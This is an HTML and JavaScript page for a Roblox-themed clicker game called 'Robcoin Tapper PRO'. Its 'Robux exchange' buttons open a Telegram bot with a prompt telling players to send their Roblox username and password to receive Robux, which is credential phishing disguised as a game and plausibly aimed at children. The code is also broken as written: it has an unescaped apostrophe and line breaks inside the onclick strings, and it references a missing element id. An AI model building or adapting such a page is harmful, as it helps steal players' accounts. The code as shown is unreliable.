<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Robcoin Tapper PRO</title>
    <style>
        body { background: #0a0f1e; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; padding: 20px; margin: 0; }
        .game-container { max-width: 500px; width: 100%; }
        .stats { display: flex; justify-content: space-around; background: #151e2c; padding: 20px; border-radius: 20px; margin-bottom: 20px; border: 1px solid #2a3b4e; }
        
        .robux-container { text-align: center; margin: 20px 0; background: transparent; }
        
        /* Видалення ефектів натискання (синє скло) */
        .robux-img { 
            width: 220px; 
            cursor: pointer; 
            transition: 0.1s; 
            outline: none; 
            -webkit-tap-highlight-color: transparent; 
            user-select: none; 
            -webkit-user-select: none;
        }
        .robux-img:active { transform: scale(0.96); }
        
        .section-title { color: #ffcc66; margin: 25px 0 10px; font-weight: bold; text-transform: uppercase; }
        .upgrade-card { background: #1c2838; padding: 15px; border-radius: 15px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #2a3b4e; }
        
        button { background: #ffcc66; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; cursor: pointer; color: #000; }
        button:disabled { background: #444 !important; color: #aaa !important; cursor: not-allowed; }
        .owned-state { background: #444 !important; color: #aaa !important; cursor: default; }
    </style>
</head>
<body>

<div class="game-container">
    <div class="stats">
        <div>💰 <span id="robuxAmount">0</span></div>
        <div>⚡ <span id="energyDisplay">10/10</span></div>
    </div>

    <div class="robux-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Robux_2022.svg/1024px-Robux_2022.svg.png">
    </div>

    <div id="powerUpgradesList"></div>

    <div class="section-title">🌟 SPECIAL SHOP</div>
    <div class="upgrade-card">
        <div>Small Miner (+10/sec)</div>
        <button id="smallMinerBtn" onclick="buySmallMiner()">BUY 1000 💰</button>
    </div>

    <div class="section-title">💎 ROBUX EXCHANGE</div>
    <div class="upgrade-card"><div>50k 💰 → 160💎</div><button id="pack1" onclick="validateExchange(50000, '👑Okay, you bought 160 Robux, here's what you need to write so they come to you:

Nick Roblox:
Password Roblox:')">EXCHANGE</button></div>
    <div class="upgrade-card"><div>100k 💰 → 360 💎</div><button id="pack2" onclick="validateExchange(100000, '👑Okay, you bought 360 Robux, here's what you need to write so they come to you:

Nick Roblox:
Password Roblox:')">EXCHANGE</button></div>
    <div class="upgrade-card"><div>200k 💰 → 800💎</div><button id="pack3" onclick="validateExchange(200000, '👑Okay, you bought 800 Robux, here's what you need to write so they come to you:

Nick Roblox:
Password Roblox:')">EXCHANGE</button></div>
</div>

<script>
    let state = { coins: 0, energy: 10, maxEnergy: 10, tapLvl: 0, hasMiner: false };
    const powerCosts = [100, 200, 500];

    function loadGame() {
        const saved = localStorage.getItem('robcoinData');
        if (saved) state = JSON.parse(saved);
    }

    function saveGame() {
        localStorage.setItem('robcoinData', JSON.stringify(state));
    }

    function updateUI() {
        document.getElementById('robuxAmount').innerText = Math.floor(state.coins);
        document.getElementById('energyDisplay').innerText = `${Math.floor(state.energy)}/${state.maxEnergy}`;
        
        document.getElementById('pack1').disabled = state.coins < 50000;
        document.getElementById('pack2').disabled = state.coins < 100000;
        document.getElementById('pack3').disabled = state.coins < 200000;
        
        const minerBtn = document.getElementById('smallMinerBtn');
        if (state.hasMiner) {
            minerBtn.innerText = "OWNED";
            minerBtn.classList.add('owned-state');
            minerBtn.disabled = true;
        } else {
            minerBtn.disabled = state.coins < 1000;
        }
        
        renderUpgrades();
        saveGame();
    }

    function renderUpgrades() {
        const pDiv = document.getElementById('powerUpgradesList');
        pDiv.innerHTML = '<div class="section-title">🔧 POWER UPGRADES</div>';
        for(let i=0; i<3; i++) {
            let isOwned = i < state.tapLvl;
            let canBuy = (i === state.tapLvl && state.coins >= powerCosts[i]);
            let btnText = isOwned ? "OWNED" : "BUY " + powerCosts[i];
            let btnClass = isOwned ? 'class="owned-state"' : '';
            
            pDiv.innerHTML += `<div class="upgrade-card"><div>Lvl ${i+1} Power</div>
                <button ${btnClass} onclick="buyUpgrade(${i})" ${isOwned || !canBuy ? 'disabled' : ''}>${btnText}</button>
            </div>`;
        }
    }

    function buyUpgrade(i) {
        if (state.coins >= powerCosts[i]) {
            state.coins -= powerCosts[i];
            state.tapLvl++;
            updateUI();
        }
    }

    function buySmallMiner() {
        if (state.coins >= 1000 && !state.hasMiner) {
            state.coins -= 1000;
            state.hasMiner = true;
            updateUI();
        }
    }

    function validateExchange(cost, ref) {
        if (state.coins >= cost) { 
            state.coins -= cost; 
            updateUI();
            window.open(`https://t.me/Shoprobcoin_bot?start=${ref}`, '_blank'); 
        }
    }

    document.getElementById('clickableRobux').onclick = () => {
        if(state.energy >= 1) { 
            state.coins += (state.tapLvl + 1); 
            state.energy--; 
            updateUI(); 
        }
    };

    setInterval(() => {
        if(state.energy < state.maxEnergy) state.energy = Math.min(state.maxEnergy, state.energy + 0.1);
        if(state.hasMiner) state.coins += 1;
        updateUI();
    }, 100);

    loadGame();
    updateUI();
</script>
</body>
</html>
